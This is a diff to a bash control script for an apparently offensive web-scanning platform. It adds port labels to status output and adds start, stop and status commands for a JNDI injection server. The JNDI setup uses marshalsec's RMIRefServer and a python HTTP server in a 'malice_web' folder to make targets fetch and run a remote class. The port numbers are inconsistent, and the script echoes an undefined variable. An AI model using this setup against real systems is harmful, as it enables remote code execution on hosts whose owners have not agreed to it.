@@ -1,4 +1,6 @@
 #! /bin/bash
+# 自定义全局变量本机IP地址
+ip_address="x.x.x.x"
 case "${1}" in
 
     #指纹识别脚本
@@ -838,7 +840,7 @@ case "${1}" in
     infopid=`ps -aux | grep  scan_main_web.py |awk -F " " '{print $2}' | wc -l`
     if (( $infopid > 1 ))
 	then
-		echo -e "running" 
+		echo -e "running  (端口：19999)" 
 	else
 		echo -e "stop"
 	fi
@@ -848,7 +850,7 @@ case "${1}" in
     xraypid=`ps -aux | grep 8081 |awk -F " " '{print $2}' | wc -l`
     if (( $xraypid > 1 ))
 	then
-		echo -e "running" 
+		echo -e "running  (端口：18888)" 
 	else
 		echo -e "stop"
 	fi
@@ -858,7 +860,7 @@ case "${1}" in
     urlfinderpid=`ps -aux | grep 8089 |awk -F " " '{print $2}' | wc -l`
     if (( $urlfinderpid > 1 ))
 	then
-		echo -e "running" 
+		echo -e "running  (端口：16666)" 
 	else
 		echo -e "stop"
 	fi
@@ -868,7 +870,7 @@ case "${1}" in
     dirscanpid=`ps -aux | grep dirscanmain.py |awk -F " " '{print $2}' | wc -l`
     if (( $dirscanpid > 1 ))
 	then
-		echo -e "running" 
+		echo -e "running  (端口：17777)" 
 	else
 		echo -e "stop"
 	fi
@@ -878,7 +880,7 @@ case "${1}" in
     afrogpid=`ps -aux | grep 8082 |awk -F " " '{print $2}' | wc -l`
     if (( $afrogpid > 1 ))
 	then
-		echo -e "running" 
+		echo -e "running  (端口：15555)" 
 	else
 		echo -e "stop"
 	fi
@@ -977,6 +979,12 @@ case "${1}" in
     bbscan_scan_num)
     bbscan_num=`cat /TIP/info_scan/result/bbscan_info.txt | wc -l`
     echo "${bbscan_num}"
+    ;;
+
+    # jndi结果数量
+    jndi_num)
+    jndi_num=`cat /TIP/info_scan/result/jndi_result.txt | wc -l`
+    echo "${jndi_num}"
     ;;
 
     # struts2结果数量
@@ -1194,5 +1202,60 @@ case "${1}" in
     tomcat_num=`cat /TIP/info_scan/result/tomcat_vuln.txt | wc -l`
     echo "${tomcat_num}"
     ;;
+
+
+    # 开启jndi服务
+    start_jndi_python)
+    cd /TIP/info_scan/jndi_server/malice_web
+    nohup python3 -m http.server 9991 --bind 127.0.0.1 > /dev/null 2>&1 &
+    ;;
+
+    start_jndi)
+    cd /TIP/info_scan/jndi_server
+    nohup java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://${ip_address}:9998/#TouchFile" 9999 > /TIP/info_scan/result/jndi_result.txt 2>&1 &
+    echo "${jndi_result}"
+    ;;
+
+
+    # 关闭jndi服务
+    stop_jndi_python)
+    jndi_python_pid=`ps -aux | grep "9991" |awk -F " " '{print $2}'`
+
+    jndi_pid=`ps -aux | grep "9999" |awk -F " " '{print $2}'`
+
+    for i in ${jndi_python_pid}
+	do
+		kill -9 ${i} 2>/dev/null
+	done
+
+    for j in ${jndi_pid}
+	do
+		kill -9 ${j} 2>/dev/null
+	done
+
+    ;;
+
+
+    # jndi服务状态
+    jndi_server_status)
+    jndi_ps=`ps -aux | grep "9999" | wc -l`
+	if (( $jndi_ps > 1 ))
+	then
+		echo "running  (端口：9999)"
+	else
+		echo "stop"
+	fi
+    ;;
+
+    jndi_python_server_status)
+    jndi_python_ps=`ps -aux | grep "9991" | wc -l`
+	if (( $jndi_python_ps > 1 ))
+	then
+		echo "running  (端口：9998)"
+	else
+		echo "stop"
+	fi
+    ;;
+
     
 esac
